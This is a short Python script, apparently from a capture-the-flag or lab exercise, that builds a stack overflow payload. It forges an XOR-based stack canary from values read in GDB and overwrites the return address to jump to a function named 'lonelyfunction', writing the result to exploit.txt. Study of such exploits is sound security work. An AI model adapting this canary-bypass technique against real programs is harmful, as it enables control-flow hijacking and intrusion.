import struct

# Create padding
padding = b"A" * 64

# Values from our analysis
globalcanary = 0x7dc5551f      # Value we found in GDB
orig_ret = 0x080485f9          # Original return address in main
new_ret = 0x08048524          # lonelyfunction address

# Calculate xorcanary using original return address
xorcanary = globalcanary ^ orig_ret

print("globalcanary: 0x%08x" % globalcanary)
print("orig_ret: 0x%08x" % orig_ret)
print("new_ret: 0x%08x" % new_ret)
print("xorcanary: 0x%08x" % xorcanary)

# Create payload structure:
payload = (
    padding +                      # 64 bytes of padding
    struct.pack("<I", xorcanary) + # xorcanary
    b"BBBB" +                      # placeholder for saved EBP
    struct.pack("<I", new_ret)     # jump to lonelyfunction
)

with open('exploit.txt', 'wb') as f:
    f.write(payload)


